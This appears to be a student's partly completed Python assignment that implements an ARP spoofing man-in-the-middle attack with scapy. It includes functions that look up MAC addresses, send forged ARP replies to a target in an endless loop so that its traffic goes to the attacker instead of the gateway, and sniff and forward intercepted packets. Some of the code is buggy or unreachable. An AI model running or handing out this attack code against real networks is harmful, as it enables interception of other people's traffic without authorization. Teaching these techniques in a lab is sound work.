#!/usr/bin/python

# Install scapy package
#pip install scapy
import scapy.all as scapy

#OR install pcap library
#pip install pypcap
import pcap

import netifaces
import threading
import time

hackedMachines = []

"""
Get the MAC address of a device on the local network given its IP address.
Args:
    ip (str): The IP address of the target device.
Returns:
    str: The MAC address of the target device.
"""

def getMacAddress(ip)->str:
    # Your coude here

    my_str = scapy.conf.ifaces
    rows = str(my_str).split("sys")
    # these two for loops are designed to split the string into rows adn columns to analyze
    for row in rows:
        columns = row.split()
        for column in columns:
            if (column == ip):
                # getting the previous value so that it is the mac address
                #print(f"column = {columns[columns.index(column) -1 ]}")
                return columns[columns.index(column) -1 ]
    return None


"""
Get the IP address of the current machine from the available network interfaces.
Returns:
    str: The selected IP address of the current machine.
"""

def getOwnIpAddress() -> str:
    # Your code here
    # List available network interfaces
    interfaces = scapy.conf.ifaces
    print("Available network interfaces:")
    for index, iface in enumerate(interfaces.values(), start=1):
        print(f"{index}: {iface}")
    
    # Prompt the user to select an interface
    try:
        choice = int(input("Enter the number of the interface to use: "))
        selected_iface = list(interfaces.values())[choice - 1]
    except (ValueError, IndexError):
        print("Invalid selection. Exiting.")
        return

    # Get the IP address of the selected interface
    iface_name = str(selected_iface)
    host_ip = scapy.get_if_addr(iface_name)
    return host_ip
    # List of available IP addresses and then pick one
    #pass
   
"""
Sends an ARP spoofing packet to the target IP address, making it believe that the spoof IP address is associated with the attacker's MAC address.
Args:
    targetIp (str): The IP address of the target machine to be spoofed.
    spoofIp (str): The IP address that the target machine should believe is associated with the attacker's MAC address.
Returns:
    None
Raises:
    Exception: If there is an error in sending the ARP packet.
Example:
    spoof("192.168.1.5", "192.168.1.1")
"""
def spoof(targetIp, spoofIp):

    mac = getMacAddress(targetIp)
    # Your code here
    my_mac = getMacAddress(getOwnIpAddress())
    # op 2 is the arp option for for arp reply
    arp_reply = scapy.ARP(op=2, hwsrc=my_mac, psrc=spoofIp, hwdst=mac, pdst=targetIp)
    # Just an idea. Try using scapy to send ARP packets to the target IP address
    # Send the packet in an infinite loop
    try:
        print(f"Sending spoofed ARP replies to {targetIp}...")
        while True:
            scapy.send(arp_reply, verbose=0)
    except KeyboardInterrupt:
        print("\nStopping ARP spoofing.")
        return
    hackedMachines.append([targetIp, mac])
    

"""
Starts the packet sniffer to capture network packets.
This function initiates the sniffing process
It captures packets and processes them to forward packets to the intended destination if it's one of the hacked machines.
Returns: None
"""

def startSniffer():
    # Start sniffing packets
    # Your code here
    # Hardcoded interface
    interface = "wlp4s0"

    # Start sniffing on the hardcoded interface
    scapy.sniff(
        iface=interface,
        store=False,
        filter="ip",
        prn=lambda packet: (
            scapy.send(packet, verbose=0)
            if IP in packet and packet[IP].dst in hackedMachines
            else None
        )
    )


def main():
    # my testing code 
    mac = getMacAddress("192.168.0.184")
    print(f"the mac address of 192.168.0.184 is {mac}")
    my_ip = getOwnIpAddress()
    print(f"the ip is {my_ip}")
    print(f"now we are going to try to spoof ")
    spoof("192.168.1.10", "192.168.1.1" )
    return
    target_ip = "192.168.1.10"  # Replace with the target IP address
    spoof_ip = "192.168.1.1"    # Replace with the IP address to spoof

    # Function to continuously call the spoof function
    def continuousSpoof():
        while True:
            spoof(target_ip, spoof_ip)
            time.sleep(2)  # Sleep for 2 seconds before sending the next spoof packet

    # Start the spoofing thread
    spoof_thread = threading.Thread(target=continuousSpoof)
    spoof_thread.start()

    # Start the packet sniffer thread
    # This thread will run in the background and sniff packets. I do it like this in case students use a blocking solution
    sniffer_thread = threading.Thread(target=startSniffer)
    sniffer_thread.start()

# Run the main function
main()